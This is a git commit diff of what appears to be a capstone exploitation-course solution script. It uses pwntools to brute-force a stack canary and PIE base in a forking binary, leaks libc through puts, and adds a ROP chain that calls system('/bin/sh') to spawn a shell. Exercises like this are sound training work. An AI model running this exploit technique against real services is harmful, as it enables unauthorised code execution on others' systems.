89b6f2f4ac72913820ab2f0fb522de150231cca4
James Fraser <wulfgar.pro@gmail.com>
2025-07-17 10:53:11 +1000

    Finished capstone

--- Exhibition_of_Mastery/soln.py
+++ Exhibition_of_Mastery/soln.py
@@ -1,5 +1,20 @@
 #!/usr/bin/env python3
 
+# The vulnerable program forks a child where it calls `overflow`. This is
+# important, since it means we can crash in the child and the parent keeps
+# running.
+#
+# The "randomization", i.e. canary, PIE, ALSR, are persistent for the
+# *current* invocation of the program (they don't change!). Also, these random
+# values are copied to the child!
+#
+# So you can brute force these things. Partial leaks are very useful - you can
+# reduce the search space significantly with just one-more-byte :)
+#
+# In our case, we first have to bruteforce the canary, and then bruteforce the
+# saved RIP to bypass PIE. After that, we can use a ROP chain to call `puts` via
+# PLT/GOT to leak canary/LIBC's base address per normal.
+
 from pwn import *
 
 context.log_level = "debug"
@@ -16,60 +31,6 @@ rop = ROP(e)
 overflow_to_canary = 264
 overflow_to_main = overflow_to_canary + 8 + 8
 overflow_to_rip = overflow_to_canary + 8 + 8 + 8 + 8
-
-# The vulnerable program forks a child where it calls `overflow`. This is
-# important, since it means we can crash in the child and the parent keeps
-# running.
-#
-# The "randomization", i.e. canary, PIE, ALSR, are "persistent" for the
-# *current* invocation of the program (they don't change!). Also, these random
-# values are copied to the child!
-#
-# So you can brute force these things. Partial leaks are very useful - you can
-# reduce the search space significantly.
-#
-# In our case, we first have to bruteforce the canary, and then bruteforce the
-# saved RIP to bypass PIE. After that, we can use a ROP chain to call `puts` via
-# PLT/GOT leak to leak canary/LIBC's base address per normal.
-#
-# For the canary,
-#
-# 0xdf1279a1b2528700
-#
-# Since we overwrite from LSB to MSB, we can test our bytes one by one to
-# confirm the current guess doesn't trigger the stack-smash crash (our oracle).
-#
-# ---
-#
-# With the canary value, let's try and brute force `overflow`'s return address
-# to `main`. Here are some example return addresses for `main+44`:
-#
-# 0x5584f3223220
-# 0x56435ae5d220
-# 0x5653ae665220
-# 0x55dc08f44220
-# 0x556d06dcd220
-#
-# Observation: The MSB changes when the following 3 bytes and 1 nibble overflow,
-# so there's no need to brute force the MSB.
-#
-# The following 3 bytes (24 bits) and 1 nibble (4 bits) make up *28* bits of
-# entropy to brute force.
-#
-# This matches my Linux Kernel's configuration:
-#
-# ```sh
-# $ sudo cat /proc/sys/vm/mmap_rnd_bits
-# 28
-# ```
-#
-# That's a search space of 256 * 256 * 256 * 16 = *268,435,456*.
-#
-# So we bruteforce saved RIP one byte at a time :).
-#
-# We can use a crash as an oracle - if the target doesn't crash, we've found the
-# correct target base address.
-
 
 # 1 - Bruteforce the canary value.
 #
@@ -158,14 +119,31 @@ payload += p64(puts_got)
 payload += p64(puts_plt)
 
 p.sendafter(b"Hey, whats your name!?\n\n", payload)
-leak_puts = p.recv(6).ljust(8, b"\x00")
+
+leak_puts = u64(p.recv(6).ljust(8, b"\x00"))
 info(f"leak_puts = {hex(leak_puts)}")
 libc_base = leak_puts - e.libc.symbols["puts"]
 info(f"libc_base = {hex(libc_base)}")
 
 pause()
 
+libc_system = libc_base + e.libc.symbols["system"]
+info(f"libc_system = {hex(libc_system)}")
+libc_bin_sh = libc_base + next(e.libc.search(b"/bin/sh"))
+info(f"libc_bin_sh = {hex(libc_bin_sh)}")
+
 # FINAL PAYLOAD
 
+payload = b"A" * overflow_to_canary
+payload += p64(u64(found_canary))
+payload += b"B" * 8  # Saved RBP
+payload += p64(pop_rdi_ret)
+payload += p64(libc_bin_sh)
+payload += p64(ret)
+payload += p64(libc_system)
+
+p.sendafter(b"Hey, whats your name!?\n\n", payload)
+
+pause(n=5)
 
 p.interactive()
